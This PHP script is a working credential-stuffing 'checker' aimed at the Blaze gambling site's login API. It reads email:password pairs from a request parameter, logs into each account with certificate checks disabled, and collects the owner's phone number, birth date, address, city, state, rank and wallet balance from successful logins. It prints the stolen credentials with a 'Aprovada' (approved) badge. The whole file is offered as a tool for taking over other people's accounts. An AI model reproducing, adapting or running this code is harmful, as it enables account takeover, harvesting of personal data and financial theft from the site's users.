<?php


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

$contador = strlen($lista);

if ($contador < 10 ){

    die("Informacoes invalidas, falta numeros a ser digitado...!");
    
}

$ant_noia = substr($lista, 0, 8);

if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false ){

    die(json_encode(array("Error" => "Vai se foder")));

}


$linklogin = "https://blaze.com/api/auth/password";
$postlogin = '{"username":"'.$email.'","password":"'.$senha.'"}';
// ================ // ====================//==========================//============================= // ================================//=================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $linklogin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'origin: https://blaze.com',
'referer: https://blaze.com/pt/?modal=auth&tab=login',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.71',
'x-client-version: 1ce22abe9'));
curl_setopt($ch, CURLOPT_POSTFIELDS, $postlogin);
echo $resposta = curl_exec($ch);
$tokendaporra = getStr2($resposta, '"access_token":"','"');


// ================ // ====================//==========================//============================= // ================================//=================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/users/me');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'authorization: Bearer '.$tokendaporra.'',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.71',
'x-client-version: 1ce22abe9'));
$info_account = curl_exec($ch);


// ================ // ====================//==========================//============================= // ================================//=================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/users/me/xp');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'authorization: Bearer '.$tokendaporra.'',
'referer: https://blaze.com/pt/?modal=auth&tab=login',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.71',
'x-client-version: 1ce22abe9'));
$comernaodaxp = curl_exec($ch);


// ================ // ====================//==========================//============================= // ================================//=================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/wallets');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); //VARIAVEL PARA CHECKER BLAZE
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'authorization: Bearer '.$tokendaporra.'',
'referer: https://blaze.com/pt/?modal=auth&tab=login',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.71',
'x-client-version: 1ce22abe9'));
$saldinho = curl_exec($ch);


// ================ // ====================//==========================//============================= // ================================//=================//


if (strpos($info_account, '"email_confirmed":true,')) {
   $Email_Confirmado = "Sim";
}else{
   $Email_Confirmado = "Nao";

}

if (strpos($info_account, '"phone_number_confirmed":false,')) {
   $Telefone_Confirmado = "Nao";
}else{
   $Telefone_Confirmado = "Sim";

}

$metraio = array("#MetralhaCheckers", "#MetraiaoBrabochks", "#MetralhaDev");
$metraia = $metraio[array_rand($metraio)];



// ================ // ====================//==========================//============================= // ================================//=================//


$saldo_balanca = getStr2($saldinho, '"real_balance":"','"');
$tipo_moeda = getStr2($saldinho, '"currency_type":"','"');

$nome_conta = getStr2($info_account, '"username":"','"');
$numero_telefone = getStr2($info_account, '"phone_number":"','"');
$data_niver_dono = getStr2($info_account, '"date_of_birth":"','"');
$endereco = getStr2($info_account, '"address":"','"');
$cidade = getStr2($info_account, '"city":"','"');
$estado = getStr2($info_account, '"state":"','"');

$level = getStr2($comernaodaxp, '"level":',',');
$tipoconta = getStr2($comernaodaxp, '"rank":"','"');
$porcentagem_xp = getStr2($comernaodaxp, '"next_level_progress":"','"');


// ================ // ====================//==========================//============================= // ================================//=================//

$Retorno = getStr2($resposta, '"message":"','"');

// ================ // ====================//==========================//============================= // ================================//=================//
         

		//echo $resposta;

if(strpos($resposta, 'access_token')!== false){

    echo "<span class='badge badge-success'>Aprovada</span> $email|$senha <span class='badge badge-info'>NOME:</span> $nome_conta  <span class='badge badge-info'>EMAIL CONFIRMADO:</span> $Email_Confirmado  <span class='badge badge-info'>TELEFONE:</span> $numero_telefone  <span class='badge badge-info'>TELEFONE CONFIRMADO:</span> $Telefone_Confirmado  <span class='badge badge-info'>DATA NASC:</span> $data_niver_dono  <span class='badge badge-info'>ENDERECO:</span> $endereco  <span class='badge badge-info'>CIDADE:</span> $cidade  <span class='badge badge-info'>ESTADO:</span> $estado  <span class='badge badge-info'>LEVEL CONTA (BLAZE):</span> $level  <span class='badge badge-info'>TIPO DE RANK:</span> $tipoconta  <span class='badge badge-info'>PORCENTAGEM %XP:</span> $porcentagem_xp  <span class='badge badge-info'>SALDO BANCA:</span> $saldo_balanca  <span class='badge badge-info'>TIPO DE MOEDA:</span> $tipo_moeda <br> ";

}
elseif(strpos($resposta, '1016')!== false){

    echo "<span class='badge badge-danger'>Error</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $Retorno <br>";

}
else{

    echo "<span class='badge badge-danger'>Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span>  $Retorno $metraia <br>";

}

?>



